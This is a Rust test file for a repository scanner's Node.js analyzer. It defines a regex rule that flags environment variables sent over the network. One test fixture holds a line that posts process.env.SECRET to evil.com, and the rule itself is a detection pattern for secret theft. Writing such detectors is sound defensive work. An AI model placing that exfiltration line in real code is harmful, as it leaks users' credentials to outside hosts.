use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-010").unwrap(),
            name: "Env variable exfiltration".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::Regex {
                value: r"process\.env.*(?:fetch|http|axios|request)|(?:fetch|http|axios|request).*process\.env".to_owned(),
            },
        }],
    })
}

#[test]
fn detects_env_sent_via_fetch() {
    let src = "fetch('https://evil.com', { body: process.env.SECRET });";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_axios_with_env_on_same_line() {
    let src = "axios.post(process.env.TARGET_URL, { key: token });";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_env_read_without_network() {
    let src = "const apiKey = process.env.API_KEY;";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert!(findings.is_empty());
}
